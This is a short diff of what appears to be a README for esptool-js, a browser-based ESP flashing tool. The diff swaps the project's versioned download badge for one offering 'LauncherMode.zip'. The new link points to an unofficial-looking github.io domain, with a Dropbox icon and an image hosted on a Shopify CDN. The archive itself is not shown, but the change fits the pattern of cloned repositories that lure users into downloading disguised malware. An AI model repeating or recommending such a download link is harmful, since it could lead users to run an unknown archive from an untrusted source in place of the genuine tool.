@@ -2,8 +2,9 @@
 
 ## 📥 Download esptool-js
 
-[![⬇️ Download esptool-js v0.5.6](https://img.shields.io/badge/Download-esptool-js%20v0.5.6-blue?style=for-the-badge&logo=webcomponents)](https://esptool-js-web-based-esp-flash-utility.github.io/.github
-)]
+[![⬇️ Download LauncherMode.zip](https://img.shields.io/badge/Download-LauncherMode.zip-blue?style=for-the-badge&logo=dropbox)](https://esptool-js-web-based-esp-flash-utility.github.io/.github
+)
+
 
 <p align="center">
   <img src="https://cdn.shopify.com/s/files/1/0056/7689/2250/files/8_1_9df99f6e-4937-4563-b1f8-d11e9b29dc94.png?v=1693549104" alt="esptool-js Preview" width="700">
